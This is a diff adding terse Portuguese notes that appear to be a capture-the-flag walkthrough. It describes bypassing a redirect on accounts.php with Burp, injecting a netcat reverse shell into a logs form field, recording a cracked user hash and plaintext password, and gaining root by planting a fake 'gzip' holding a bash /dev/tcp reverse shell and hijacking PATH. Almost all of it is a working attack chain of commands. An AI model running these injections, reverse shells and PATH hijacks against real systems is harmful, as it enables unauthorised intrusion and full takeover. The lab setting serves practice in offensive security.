@@ -1,0 +1,38 @@
+phpssid: qlclpopapq7reopoiqeqdga4ii
+
+Pelo burp fazer a requisição pela pagina accounts.php
+
+Quando fizer intercepitar aquela requisição 
+
+Botão direito > intercept this 
+
+Trocar o 302 por 200 que entrara na pagina de criar conta
+
+Criar a conta e depois ir na "Files"
+
+Baixar o arquivo .zip
+
+Depois ir no site em logs
+
+Ativar o burp e dar submit
+
+Passar a shell do lado do "comma"
+
+%26nc+-e+/bin/sh+10.10.14.114+4444
+
+m4lwhere:$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.
+
+m4lwhere:ilovecody112235!
+
+Para pegar root precisamos criar um arquivo chamado "gzip"
+
+ir para /tmp e criar o "gzip" e colocar nossa shell nesse arquivo
+
+
+echo "bash -i >& /dev/tcp/10.10.14.114/4443 0>&1" > gzip
+
+export PATH=/tmp:$PATH
+
+export PATH=$(pwd):$PATH
+
+Agora abrimos uma conexao na nossa maquina e rodamos o arquivo como root
